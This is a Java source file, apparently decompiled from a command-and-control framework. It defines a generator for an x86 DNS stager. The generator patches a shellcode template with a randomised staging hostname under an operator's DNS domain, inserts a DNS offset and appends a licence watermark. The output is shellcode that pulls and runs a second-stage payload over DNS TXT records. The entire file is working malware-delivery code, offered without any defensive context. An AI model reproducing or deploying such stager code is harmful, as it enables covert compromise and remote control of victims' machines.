package stagers;

import common.CommonUtils;
import common.Packer;
import common.ScListener;

public abstract class GenericDNSStagerX86 extends GenericStager {
    public GenericDNSStagerX86(ScListener scListener) {
        super(scListener);
    }

    public String arch() {
        return "x86";
    }

    public abstract String getDNSHost();

    public String getHost() {
        long l = CommonUtils.rand(16777215);
        return ".stage." + l + "." + getDNSHost();
    }

    public byte[] generate() {
        String str1 = CommonUtils.bString(CommonUtils.readResource("resources/dnsstager.bin"));
        String str2 = getConfig().pad(getHost() + Character.MIN_VALUE, 60);
        if (str2.length() > 60)
            CommonUtils.print_error("DNS Staging Host '" + str2 + "' is too long! (DNS TXT record stager will crash!)");
        int i = str1.indexOf(".ABCDEFGHIJKLMNOPQRSTUVWXYZXXXX");
        str1 = CommonUtils.replaceAt(str1, str2, i);
        Packer packer = new Packer();
        packer.little();
        packer.addInt(getConfig().getDNSOffset());
        str1 = CommonUtils.replaceAt(str1, CommonUtils.bString(packer.getBytes()), 509) + getConfig().getWatermark();
        return CommonUtils.toBytes(str1);
    }
}
